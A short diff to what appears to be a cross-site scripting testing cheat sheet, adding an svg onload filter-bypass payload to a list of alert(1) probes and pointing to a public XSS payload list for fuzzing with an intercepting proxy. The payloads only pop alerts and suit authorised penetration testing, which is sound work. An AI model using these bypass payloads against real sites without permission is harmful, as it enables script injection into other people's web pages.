@@ -59,6 +59,7 @@ Is <.script>alert(1)<./script.> filtered? Try: <br>
 <.randomfaketag id=x onwheel=alert(1)><br>
 <.a href=javascript:alert(1)>click</a.><br>
 <.ScRiPt>alert(1)<./ScRiPt><br>
+ <.svg onload/%0A=alert;throw 1337><br>
  <br>
 Run through the payload list here on intruder and select grep for url decoded values https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt <br>
  <br>
